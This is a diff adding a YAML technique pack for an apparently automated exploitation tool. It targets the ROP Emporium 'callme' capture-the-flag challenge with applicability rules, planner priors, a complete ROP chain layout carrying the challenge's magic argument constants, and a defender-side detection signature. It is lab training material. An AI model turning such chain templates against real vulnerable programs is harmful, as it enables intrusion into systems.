@@ -1,0 +1,66 @@
+# Canonique: le modele de technique pack pour agents et operateurs.
+# Structure, vocabulaire et limites: voir docs/pack-format.md.
+technique: callme
+author: Gregory Epp
+source: https://ropemporium.com/challenge/callme.html
+
+rules:
+  - id: app_callme
+    head: [applicable, callme]
+    conditions:
+      - [fact, vuln, sof]
+      - [fact, nx, true]
+      - [fact, pie, false]
+      - [fact, plt, callme_one]
+      - [fact, plt, callme_two]
+      - [fact, plt, callme_three]
+      - [match, gadget, 0, pop_rdi]
+      - [match, gadget, 0, pop_rsi_r15]
+      - [match, gadget, 0, pop_rdx]
+
+kb:
+  - id: callme_001
+    technique: callme
+    description: >
+      Three consecutive PLT calls (callme_one/two/three), each with the
+      challenge's magic argument triple; the third call decrypts the
+      encrypted flag and prints it. rdi rides pop_rdi, rsi rides
+      pop_rsi_r15 (a dud r15 follows), rdx rides pop_rdx - all full
+      64-bit values, no leak needed (non-PIE, everything static).
+    chain: [pop_rdi, pop_rsi_r15, pop_rdx, callme_one, callme_two, callme_three]
+    unlocks: [flag]
+    success_rate: 0.9
+
+mcts:
+  requires: []
+  provides: [flag]
+  terminal: true
+  success: 0.85
+
+priors: [10, 1]
+
+# The assembly order, resolved by lictor's builder from the facts. The
+# argument triple is the corpus's magic (0xdeadbeefdeadbeef,
+# 0xcafebabecafebabe, 0xd00df00dd00df00d) written as decimal consts;
+# the r15 slot of pop_rsi_r15 is a dud (const:0). Measured on the
+# x86_64 corpus binary: no alignment word needed between the calls.
+build:
+  technique: callme
+  layout:
+    - [padding, measured_offset]
+    - [chain, "gadget:pop_rdi_ret", "const:16045690984833335023",
+       "gadget:pop_rsi_r15_ret", "const:14627333968358193854", "const:0",
+       "gadget:pop_rdx_ret", "const:14991902676702064653", "plt_addr:callme_one",
+       "gadget:pop_rdi_ret", "const:16045690984833335023",
+       "gadget:pop_rsi_r15_ret", "const:14627333968358193854", "const:0",
+       "gadget:pop_rdx_ret", "const:14991902676702064653", "plt_addr:callme_two",
+       "gadget:pop_rdi_ret", "const:16045690984833335023",
+       "gadget:pop_rsi_r15_ret", "const:14627333968358193854", "const:0",
+       "gadget:pop_rdx_ret", "const:14991902676702064653", "plt_addr:callme_three"]
+
+# The defender side (the corpus read backwards): what this technique
+# looks like to the defenses. Armored by check 9.
+detection:
+  - channel: crash
+    signature: "three consecutive calls into one shared library through pop chains"
+    note: "the triplet pattern repeating three times on the stack"
